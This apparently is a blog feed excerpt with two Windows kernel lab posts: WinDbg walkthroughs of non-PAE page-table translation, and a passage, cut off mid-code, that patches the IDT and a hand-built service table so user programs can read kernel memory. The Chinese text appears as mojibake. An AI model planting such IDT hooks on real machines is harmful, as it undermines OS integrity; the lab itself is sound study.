Decimal (unsigned) : 4298672</span><br><span class="line">  Octal:   00020313660</span><br><span class="line">  Binary:  00000000 01000001 10010111 10110000</span><br><span class="line">  Chars:   .A..</span><br><span class="line">  Time:    Fri Feb 20 02:04:32 1970</span><br><span class="line">  Float:   low 6.02372e-039 high 0</span><br><span class="line">  Double:  2.12383e-317</span><br></pre></td></tr></table></figure><p><img src="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/image-20230601152207229.png" alt="image-20230601152207229"></p><p>004197B0å°±æ˜¯æˆ‘ä»¬çš„çº¿æ€§åœ°å€ï¼ŒæŒ‰ç…§ç»å…¸äºŒçº§é¡µè¡¨åˆ†å¼€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="number">01</span> <span class="comment">//0x1</span></span><br><span class="line"><span class="number">000001</span> <span class="number">1001</span> <span class="comment">//0x19</span></span><br><span class="line"><span class="number">0111</span> <span class="number">10110000</span> <span class="comment">//0x7B0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">0xdac000</span></span><br><span class="line">#  dac000 <span class="number">0303</span>a067 <span class="number">00899067</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure><blockquote><p>windbg å‰é¢åŠ ä¸ª! æŸ¥çœ‹ç‰©ç†å†…å­˜</p></blockquote><p>ç¬¬ä¸€é¡¹æ‰¾åˆ°é¡µç›®å½•é¡¹ 00899067ï¼Œåé¢ä¸‰ä½æ˜¯å±æ€§ä½ï¼Œé¡µè¡¨åœ°å€ä¸º00899000</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">00899000</span> + <span class="number">0x19</span>*<span class="number">4</span></span><br><span class="line">#  <span class="number">899064</span> <span class="number">0025f</span>067 <span class="number">00861067</span> <span class="number">00004025</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°é¡µè¡¨é¡¹PTE 0025f067 åŒæ ·åé¢ä¸‰ä½æ˜¯å±æ€§ï¼Œç‰©ç†åŸºåœ°å€ä¸º0025f000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!db 0025f000 + 0x7B0</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 25f7b0 78 56 34 12 00 00 00 00-00 00 00 00 00 00 00 00 xV4.............</span></span><br></pre></td></tr></table></figure><p>windbgæä¾›äº†<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/-vtop">!vtop</a>æ‰©å±•å°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç›¸åº”çš„ç‰©ç†åœ°å€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">!vtop PFN VirtualAddress </span><br><span class="line">PFN</span><br><span class="line">Specifies the page frame <span class="title function_">number</span> <span class="params">(PFN)</span> of the directory base <span class="keyword">for</span> the process.</span><br><span class="line">VirtualAddress</span><br><span class="line">Specifies the virtual address whose page is desired.</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !vtop <span class="number">0xdac</span> <span class="number">004197B</span>0</span><br><span class="line">X86VtoP: Virt <span class="number">00000000004197b</span>0, pagedir <span class="number">0000000000</span>dac000</span><br><span class="line">X86VtoP: PDE <span class="number">0000000000</span>dac004 - <span class="number">00899067</span></span><br><span class="line">X86VtoP: PTE <span class="number">0000000000899064</span> - <span class="number">0025f</span>067</span><br><span class="line">X86VtoP: Mapped phys <span class="number">000000000025f</span>7b0</span><br><span class="line">Virtual address <span class="number">4197b</span>0 translates to physical address <span class="number">25f</span>7b0.</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹è¿›ç¨‹ä½2Gå†…å­˜"><a href="#æŸ¥çœ‹è¿›ç¨‹ä½2Gå†…å­˜" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹ä½2Gå†…å­˜"></a>æŸ¥çœ‹è¿›ç¨‹ä½2Gå†…å­˜</h3><p>ç›´æ¥dæ¥çš„ä½2gï¼Œç”±äºç³»ç»Ÿæœ‰å¾ˆå¤šè¿›ç¨‹ï¼Œdbgä¸çŸ¥é“è¯»å“ªä¸ª</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; db <span class="number">004197B</span>0</span><br><span class="line"><span class="number">004197b</span>0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????</span><br><span class="line"><span class="number">004197</span>c0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????</span><br></pre></td></tr></table></figure><p>å¯ä»¥.process 81398480</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process 81398480</span></span><br><span class="line">ReadVirtual: 81398498 not properly sign extended</span><br><span class="line">Implicit process is now 81398480</span><br><span class="line">WARNING: .cache forcedecodeuser is not enabled</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">db 004197B0</span></span><br><span class="line">004197b0  78 56 34 12 00 00 00 00-00 00 00 00 00 00 00 00  xV4.............</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=00039000</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä»–çš„cr3è¿˜æ˜¯åŸæ¥çš„ï¼Œå¯èƒ½è‡ªå·±æœ‰æ—¶å€™ä¸æ³¨æ„å¯¼è‡´ä¸€äº›ä¸å¿…è¦çš„éº»çƒ¦</p><p>æœ€å¥½.process &#x2F;i 81398480(&#x2F;i å°†è°ƒè¯•å™¨çš„å½“å‰è¿›ç¨‹åˆ‡æ¢åˆ°æŒ‡å®šè¿›ç¨‹æ˜ åƒè·¯å¾„å¯¹åº”çš„è¿›ç¨‹) ç„¶ågä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 81398480</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">804e4592 cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=00dac000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">db 004197B0</span></span><br><span class="line">004197b0  78 56 34 12 00 00 00 00-00 00 00 00 00 00 00 00  xV4.............</span><br></pre></td></tr></table></figure><h3 id="é¡µç›®å½•å’Œé¡µè¡¨åœ¨è™šæ‹Ÿå†…å­˜é‡Œçš„è¡¨"><a href="#é¡µç›®å½•å’Œé¡µè¡¨åœ¨è™šæ‹Ÿå†…å­˜é‡Œçš„è¡¨" class="headerlink" title="é¡µç›®å½•å’Œé¡µè¡¨åœ¨è™šæ‹Ÿå†…å­˜é‡Œçš„è¡¨"></a>é¡µç›®å½•å’Œé¡µè¡¨åœ¨è™šæ‹Ÿå†…å­˜é‡Œçš„è¡¨</h3><blockquote><p>CR3ä¸­å­˜å‚¨çš„æ˜¯ç‰©ç†åœ°å€ï¼Œä¸èƒ½åœ¨ç¨‹åºä¸­ç›´æ¥è¯»å–çš„ã€‚å¦‚æœæƒ³è¯»å–ï¼Œä¹Ÿè¦æŠŠCr3çš„å€¼æŒ‚åˆ°PDTå’ŒPTTä¸­æ‰èƒ½è®¿é—®ï¼Œé‚£ä¹ˆæ€ä¹ˆé€šè¿‡çº¿æ€§åœ°å€è®¿é—®PDTå’ŒPTTå‘¢ï¼Ÿ</p><p>æœ‰äº†å›ºå®šåœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡çº¿æ€§åœ°å€æ¥è®¿é—®é¡µç›®å½•å’Œé¡µè¡¨ï¼Œæ–¹ä¾¿ç»´æŠ¤ ä¼¼ä¹32ä½ç³»ç»Ÿå¤§éƒ¨åˆ†è¿™æ ·å®ç°</p></blockquote><p><img src="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/image-20230601202830592.png" alt="image-20230601202830592"></p><p>é¡µç›®å½•è¡¨æ˜¯æ”¾åœ¨0xc0300000å¤„ï¼ŒäºŒçº§é¡µè¡¨å‰3gæ˜¯ä»0xc0000000å¤„ï¼Œåé¢1Gæ˜¯ä»0xc030 0000å¼€å§‹</p><blockquote><p>è¿™é‡Œæˆ‘è§‰çš„ä¸€ä¸ªæ¯”è¾ƒå·§å¦™çš„ç‚¹æ˜¯ï¼Œä¸­é—´çš„4kçš„é¡µç›®å½•è¡¨</p><p>é¦–å…ˆ0xc000 0000æ˜¯è™šæ‹Ÿå†…å­˜3Gçš„èµ·ç‚¹ï¼Œé¡µç›®å½•è¡¨æ˜¯ä»0xc0300000å¼€å§‹å 4kï¼Œç›¸å½“äºè™šæ‹Ÿåœ°å€3Gå¼€å§‹å¤„çš„4Mä¸ç”¨æè¿°ï¼Œè¿™ä¸ª4Mæ­£å¥½æ˜¯æ‰€æœ‰é¡µè¡¨çš„æ€»å¤§å°</p></blockquote><p>æ‰€æœ‰ä»è™šæ‹Ÿåœ°å€addrå¾—åˆ°ä»–çš„é¡µè¡¨é¡¹è™šæ‹Ÿåœ°å€å…¬å¼ä¸º ((addr &gt;&gt; 12) &lt;&lt; 2) + 0xc0000000</p><blockquote><p>&gt;&gt;12ç›¸å½“äºé™¤ä»¥pageå¤§å°4kç®—å‡ºindex(å› ä¸ºä¸€ä¸ªé¡µè¡¨é¡¹æè¿°4kå¤§å°ç‰©ç†å†…å­˜)ï¼Œ&lt;&lt;2ä¸€ä¸ªé¡µè¡¨é¡¹4byte</p></blockquote><p>é¡µç›®å½•é¡¹è™šæ‹Ÿåœ°å€å…¬å¼ä¸º ((addr &gt;&gt; 22) &lt;&lt;2) + 0xc0300000</p><blockquote><p>&gt;&gt;22é™¤ä»¥4M(å› ä¸ºä¸€ä¸ªé¡µç›®å½•é¡¹æè¿°4Må†…å­˜)</p></blockquote><p><strong>è°ƒè¯•</strong></p><p>æ‰‹æ®‹ã€‚ã€‚ï¼ŒæŠŠåŸæ¥çš„test.exeå…³äº†,ç°åœ¨cr3æ˜¯ä¸‹é¢çš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_cr3:<span class="number">0x1fcc000</span></span><br><span class="line">local num address:<span class="number">004197B</span>0</span><br><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 8162dc30  SessionId: 0  Cid: 00c8    Peb: 7ffd6000  ParentCid: 04a4</span><br><span class="line">    DirBase: 01fcc000  ObjectTable: e2436230  HandleCount:  15.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 8162dc30</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">ntStatus=0Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">804e4592 cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=01fcc000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!vtop 1fcc 004197B0</span></span><br><span class="line">X86VtoP: Virt 00000000004197b0, pagedir 0000000001fcc000</span><br><span class="line">X86VtoP: PDE 0000000001fcc004 - 007f3067</span><br><span class="line">X86VtoP: PTE 00000000007f3064 - 0c889067</span><br><span class="line">X86VtoP: Mapped phys 000000000c8897b0</span><br><span class="line">Virtual address 4197b0 translates to physical address c8897b0.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!db c8897b0 l8</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c8897b0 78 56 34 12 00 00 00 00 xV4......EN.....</span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                 VA 004197b0</span><br><span class="line">PDE at C0300004         PTE at C0001064</span><br><span class="line">contains 007F3067       contains 0C889067</span><br><span class="line">pfn 7f3   ---DA--UWEV   pfn c889  ---DA--UWEV</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0&gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">2</span>) + <span class="number">0</span>xc0000000</span></span><br><span class="line">unsigned int 0xc0001064</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dd <span class="number">0</span>xc0001064</span> </span><br><span class="line">c0001064  0c889067 0025b067 039aa025 00000000</span><br><span class="line">c0001074  00000000 00000000 00000000 00000000</span><br><span class="line">c0001084  00000000 00000000 00000000 00000000</span><br><span class="line">c0001094  00000000 00000000 00000000 00000000</span><br><span class="line">c00010a4  00000000 00000000 00000000 00000000</span><br><span class="line">c00010b4  00000000 00000000 00000000 00000000</span><br><span class="line">c00010c4  00000000 00000000 00000000 00000000</span><br><span class="line">c00010d4  00000000 00000000 00000000 00000000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dd <span class="number">00000000007</span>f3064</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3064 <span class="number">0</span>c889067 <span class="number">0025</span>b067 <span class="number">039</span>aa025 <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3074 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3084 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3094 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30a4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30b4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30c4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30d4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0 &gt;&gt; <span class="number">22</span>) &lt;&lt;<span class="number">2</span>) + <span class="number">0</span>xc0300000</span></span><br><span class="line">unsigned int 0xc0300004</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dd <span class="number">0</span>xc0300004</span></span><br><span class="line">ReadVirtual: c0300004 not properly sign extended</span><br><span class="line">c0300004  007f3067 00000000 00000000 00000000</span><br><span class="line">c0300014  00000000 00000000 00000000 00000000</span><br><span class="line">c0300024  00000000 00000000 00000000 00000000</span><br><span class="line">c0300034  00000000 00000000 00000000 00000000</span><br><span class="line">c0300044  00000000 00000000 00000000 00000000</span><br><span class="line">c0300054  00000000 00000000 00000000 00000000</span><br><span class="line">c0300064  00000000 00000000 00000000 00000000</span><br><span class="line">c0300074  00000000 00000000 00000000 00000000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dd <span class="number">0000000001</span>fcc004</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc004 <span class="number">007</span>f3067 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc014 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc024 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc034 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc044 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc054 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc064 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc074 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å®é™…æ˜¯ä¸€å—ç‰©ç†å†…å­˜</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:ç³»ç»Ÿè°ƒç”¨(system call)</title>
      <link href="/2023/05/31/Windows-Kernel-Experiment-system-call/"/>
      <url>/2023/05/31/Windows-Kernel-Experiment-system-call/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-ç³»ç»Ÿè°ƒç”¨-system-call"><a href="#Windowså†…æ ¸å®éªŒ-ç³»ç»Ÿè°ƒç”¨-system-call" class="headerlink" title="Windowså†…æ ¸å®éªŒ:ç³»ç»Ÿè°ƒç”¨(system call)"></a>Windowså†…æ ¸å®éªŒ:ç³»ç»Ÿè°ƒç”¨(system call)</h1><p>å®ç°ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè¯»å’Œç”³è¯·å†…æ ¸ç©ºé—´</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">ReadMem</span><span class="params">(DWORD address)</span> </span><br><span class="line">DWORD <span class="title function_">AllocMem</span><span class="params">(DWORD size)</span> </span><br></pre></td></tr></table></figure><p>ExAllocatePoolåˆ†é…ä¸€å—å†…å­˜æˆ–è€…åœ¨å†…æ ¸é‡Œæ‰¾ä¸€å—å®‰å…¨çš„å†…æ ¸ä¸ä¼šç”¨åˆ°çš„å†…å­˜æ¥å­˜æ”¾æŒ‡ä»¤</p><p>é€‰å–ä¸‹é¢çš„ç©ºä½™å†…æ ¸å†…å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq @gdtr l80</span></span><br><span class="line">8003f000  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">....... SystemCallEntry</span><br><span class="line">8003f120  00000000`8003f128 00000000`8003f130</span><br><span class="line">8003f130  00000000`8003f138 00000000`8003f140</span><br><span class="line">8003f140  00000000`8003f148 00000000`8003f150</span><br><span class="line">8003f150  00000000`8003f158 00000000`8003f160</span><br><span class="line">8003f160  00000000`8003f168 00000000`8003f170</span><br><span class="line">8003f170  00000000`8003f178 00000000`8003f180</span><br><span class="line">8003f180  00000000`8003f188 00000000`8003f190</span><br><span class="line">8003f190  00000000`8003f198 00000000`8003f1a0</span><br><span class="line">8003f1a0  00000000`8003f1a8 00000000`8003f1b0</span><br><span class="line">8003f1b0  00000000`8003f1b8 00000000`8003f1c0</span><br><span class="line">8003f1c0  00000000`8003f1c8 00000000`8003f1d0</span><br><span class="line">........  ReadMem</span><br><span class="line">8003f1d0  00000000`8003f1d8 00000000`8003f1e0</span><br><span class="line">8003f1e0  00000000`8003f1e8 00000000`8003f1f0</span><br><span class="line">8003f1f0  00000000`8003f1f8 00000000`8003f200</span><br><span class="line">8003f200  00000000`8003f208 00000000`8003f210</span><br><span class="line">........  AllocMem</span><br><span class="line">8003f210  00000000`8003f218 00000000`8003f220</span><br><span class="line">8003f220  00000000`8003f228 00000000`8003f230</span><br><span class="line">8003f230  00000000`8003f238 00000000`8003f240</span><br><span class="line">8003f240  00000000`8003f248 00000000`8003f250</span><br><span class="line">........</span><br><span class="line">8003f250  00000000`8003f258 00000000`8003f260</span><br><span class="line">8003f260  00000000`8003f268 00000000`8003f270</span><br><span class="line">........Service Table</span><br><span class="line">8003f270  00000000`8003f278 00000000`8003f280</span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿè°ƒç”¨å…¥å£å‡½æ•°SystemCallEntryæ¥é€šè¿‡eaxçš„å€¼åœ¨ç³»ç»Ÿè°ƒç”¨è¡¨Service Tableé‡Œç¡®å®šç³»ç»Ÿå‡½æ•°åšç³»ç»Ÿè°ƒç”¨</p><p>makeKernel.exe</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> AD_CALLENTRY, AD_READ, AD_ALLOC &#125;;</span><br><span class="line">DWORD Address[<span class="number">3</span>] = &#123; <span class="number">0x8003f120</span> ,<span class="number">0x8003f1d0</span>,<span class="number">0x8003f210</span> &#125;;</span><br><span class="line">PDWORD ServiceTable = (PDWORD)<span class="number">0x8003f270</span>;</span><br><span class="line">PDWORD IdtAddress = (PDWORD)<span class="number">0x8003f508</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">char</span>* des;</span><br><span class="line"><span class="type">void</span> <span class="title function_">SystemCallEntry</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ReadMem</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AllocMem</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    &#125;</span><br><span class="line">    des = (<span class="type">char</span>*)Address[AD_CALLENTRY];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0xb0</span>; i++) &#123;</span><br><span class="line">        *des = ((<span class="type">char</span>*)SystemCallEntry)[i];</span><br><span class="line">        des++;</span><br><span class="line">    &#125;</span><br><span class="line">    des = (<span class="type">char</span>*)Address[AD_READ];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        *des = ((<span class="type">char</span>*)ReadMem)[i];</span><br><span class="line">        des++;</span><br><span class="line">    &#125;</span><br><span class="line">    des = (<span class="type">char</span>*)Address[AD_ALLOC];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        *des = ((<span class="type">char</span>*)AllocMem)[i];</span><br><span class="line">        des++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ„å»ºç³»ç»Ÿè°ƒç”¨è¡¨</span></span><br><span class="line">    ServiceTable[<span class="number">0</span>] = Address[AD_READ];</span><br><span class="line">    ServiceTable[<span class="number">1</span>] = Address[AD_ALLOC];</span><br><span class="line">    <span class="comment">//æ„å»º21å·ä¸­æ–­ä¸ºæˆ‘ä»¬çš„ç³»ç»Ÿè°ƒç”¨å…¥å£SystemCallEntryåœ°å€</span></span><br><span class="line">    <span class="comment">//eq 8003f508 8003ee00`0008f120 </span></span><br><span class="line">    IdtAddress[<span class="number">0</span>] = <span class="number">0x0008f120</span>;</span><br><span class="line">    IdtAddress[<span class="number">1</span>] = <span class="number">0x8003ee00</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        cli</span><br><span class="line">        push <span class="number">0x3B</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) SystemCallEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">        <span class="comment">//ä¸­æ–­ååœ¨å†…æ ¸æ ˆé‡Œä¾æ¬¡ä¸º (å¯é€‰å‡ºé”™ç ) r0_ret_eip r3_cs r3_eflag r3_esp r3_ss</span></span><br><span class="line">        <span class="comment">//+0xcå–å‡ºä¸‰ç¯çš„esp</span></span><br><span class="line">        mov ebx, ss: [esp + <span class="number">0xc</span>]</span><br><span class="line">        <span class="comment">//ä»ä¸‰ç¯æ ˆé‡Œå–å‡ºç¬¬ä¸€ä¸ªå‚æ•°ç»™åˆ°rdiåšfastcall(ä¹ æƒ¯äº†linuxçš„fastcallï¼Œæœ€åå‘ç°windowsæ˜¯ecxï¼Œedxæ‡’å¾—æ”¹äº†)</span></span><br><span class="line">        mov edi, ds: [ebx + <span class="number">4</span>]</span><br><span class="line">        <span class="comment">//æ ¹æ®eaxåœ¨è°ƒç”¨è¡¨é‡Œæ‰¾åˆ°å‡½æ•°</span></span><br><span class="line">        mov ebx, <span class="number">0x8003f270</span></span><br><span class="line">        mov edx, [ebx + eax * <span class="number">4</span>]</span><br><span class="line">        call edx</span><br><span class="line"></span><br><span class="line">        cli</span><br><span class="line">        push <span class="number">0x3b</span></span><br><span class="line">        pop fs</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) ReadMem() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, ds: [edi]</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) AllocMem() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push edi</span><br><span class="line">        push <span class="number">0</span></span><br><span class="line">        mov edx, <span class="number">0x80533708</span></span><br><span class="line">        <span class="comment">//ExAllocatePool = 0x80533708;</span></span><br><span class="line">        <span class="comment">//ExAllocatePoolæ˜¯ä¸ªstdcallï¼Œå†…å¹³æ ˆï¼Œä¸éœ€è¦æˆ‘ä»¬å¹³æ ˆ</span></span><br><span class="line">        call edx</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != (DWORD)IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‰ç¯æµ‹è¯•ç¨‹åºntdll.exe</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">DWORD __declspec(naked) ReadMem(DWORD address) &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,<span class="number">0</span><span class="comment">//ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">        <span class="type">int</span> <span class="number">0x21</span></span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">DWORD __declspec(naked) AllocMem(DWORD size) &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, <span 